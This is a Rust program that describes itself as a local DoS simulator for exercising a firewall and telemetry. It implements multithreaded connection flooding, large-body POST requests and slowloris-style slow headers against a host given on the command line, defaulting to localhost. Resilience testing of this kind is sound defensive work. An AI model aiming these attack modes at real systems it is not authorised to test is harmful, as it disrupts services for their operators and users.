/*! Zero-deps DoS simulator (for local testing)
Arabic: محاكي هجمات DoS للاختبار المحلي بدون تبعيات.
English: Local DoS traffic generator to exercise firewall/telemetry.
*/

use std::io::{Read, Write};
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let host = args
        .get(1)
        .cloned()
        .unwrap_or_else(|| "127.0.0.1:8099".to_string());
    let mode = args.get(2).cloned().unwrap_or_else(|| "flood".to_string()); // flood|bigbody|slow
    let clients: usize = args.get(3).and_then(|s| s.parse().ok()).unwrap_or(20);
    let per_client: usize = args.get(4).and_then(|s| s.parse().ok()).unwrap_or(50);
    let body_kb: usize = args.get(5).and_then(|s| s.parse().ok()).unwrap_or(1024); // for bigbody
    let slow_ms: u64 = args.get(6).and_then(|s| s.parse().ok()).unwrap_or(50); // per header line for slow mode

    eprintln!(
        "DoS sim → host={}, mode={}, clients={}, per_client={}, body_kb={}, slow_ms={}",
        host, mode, clients, per_client, body_kb, slow_ms
    );

    let mut ths = Vec::new();
    for _ in 0..clients {
        let hostc = host.clone();
        let modec = mode.clone();
        ths.push(thread::spawn(move || match modec.as_str() {
            "bigbody" => run_bigbody(&hostc, per_client, body_kb),
            "slow" => run_slowloris(&hostc, per_client, slow_ms),
            _ => run_flood(&hostc, per_client),
        }));
    }
    for t in ths {
        let _ = t.join();
    }
}

fn run_flood(host: &str, n: usize) {
    for _ in 0..n {
        if let Ok(mut s) = TcpStream::connect(host) {
            let req = b"GET /metrics HTTP/1.1\r\nHost: local\r\nConnection: close\r\n\r\n";
            let _ = s.write_all(req);
            let mut buf = [0u8; 256];
            let _ = s.read(&mut buf);
        }
    }
}

fn run_bigbody(host: &str, n: usize, kb: usize) {
    let body = vec![b'X'; kb * 1024];
    for _ in 0..n {
        if let Ok(mut s) = TcpStream::connect(host) {
            let hdr = format!(
                "POST /risk HTTP/1.1\r\nHost: local\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            );
            let _ = s.write_all(hdr.as_bytes());
            let _ = s.write_all(&body);
            let mut buf = [0u8; 128];
            let _ = s.read(&mut buf);
        }
    }
}

fn run_slowloris(host: &str, n: usize, slow_ms: u64) {
    for _ in 0..n {
        if let Ok(mut s) = TcpStream::connect(host) {
            let _ = s.write_all(b"GET /metrics HTTP/1.1\r\n");
            thread::sleep(Duration::from_millis(slow_ms));
            let _ = s.write_all(b"Host: local\r\n");
            thread::sleep(Duration::from_millis(slow_ms));
            let _ = s.write_all(b"User-Agent: dos-sim\r\n");
            thread::sleep(Duration::from_millis(slow_ms));
            let _ = s.write_all(b"Connection: close\r\n\r\n");
            let mut buf = [0u8; 128];
            let _ = s.read(&mut buf);
        }
    }
}
